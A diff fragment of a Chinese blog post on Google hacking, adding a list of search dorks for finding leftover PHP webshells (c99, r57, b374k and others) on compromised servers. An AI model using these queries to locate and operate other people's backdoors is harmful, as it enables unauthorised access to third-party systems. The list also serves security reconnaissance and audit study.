+<h2 id="遗留webshell"><a href="#遗留webshell" class="headerlink" title="遗留webshell"></a>遗留webshell</h2><pre><code class="txt">inurl:b374k.php filetype:php
+inurl:c99.php
+inurl:c100.php Generation time:
+inurl:itsecteam_shell.php
+intext:x2300 Locus7Shell v. 1.0a beta Modded by
+intext:c99shell inurl:c99.php
+powered by Captain Crunch Security Team
+&quot;inurl:c99.php&quot; + &quot;intext:safe&quot;
+intitle:r57shell
+intitle:c99shell +uname
+inurl:c99.php uid=0(root)
+intitle:c99shell+filetype:php
+intitle:ly0kha shell
+inurl:.php &quot;cURL: ON MySQL: ON MSSQL: OFF&quot;
+&quot;Shell&quot; filetypehp intext:&quot;uname -a:&quot; &quot;EDT 2010&quot;
+intitle:&quot;intitle:r57shell&quot;
+inurl:&quot;c99.php&quot; &amp; intext:Encoder Tools Proc.
+inurl:&quot;c100.php&quot; &amp; intext:Encoder Tools Proc.
+intitle:&quot;Shell&quot; inurl:&quot;.php&quot; &amp; intext:Encoder Tools Proc.</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 zjre@qq.com </span>
@@ -846,12 +1029,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>MySql(数据过滤)</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">1.1k</span></p>
+    <p><span class="copy-title">文章标题:</span>GoogleHacking</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">2.6k</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="ZJR">ZJR</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-02-02, 10:55:26</p>
-    <p><span class="copy-title">最后更新:</span>2020-02-11, 21:30:24</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/02/02/MySql-Course03/" title="MySql(数据过滤)">http://zjr-g.github.io/2020/02/02/MySql-Course03/</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-27, 22:18:36</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-27, 22:20:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/27/GoogleHacking/" title="GoogleHacking">http://zjr-g.github.io/2020/04/27/GoogleHacking/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
